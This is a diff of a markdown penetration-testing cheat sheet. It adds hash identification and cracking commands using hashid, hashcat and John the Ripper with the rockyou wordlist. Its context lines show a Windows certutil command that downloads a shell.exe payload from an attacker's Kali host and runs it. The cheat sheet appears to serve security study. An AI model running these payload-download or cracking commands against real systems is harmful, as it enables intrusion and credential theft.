@@ -45,6 +45,24 @@ python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 cmd /c C:\\Windows\\temp\\shell.exe
 ````
+### Hashing & Cracking them
+#### Enumeration
+````
+hashid <paste your hash here>
+````
+````
+https://hashcat.net/wiki/doku.php?id=example_hashes
+````
+#### Cracking
+````
+https://crackstation.net/
+````
+````
+hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
+````
+````
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+````
 ## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
 
 ## MSFVENOM
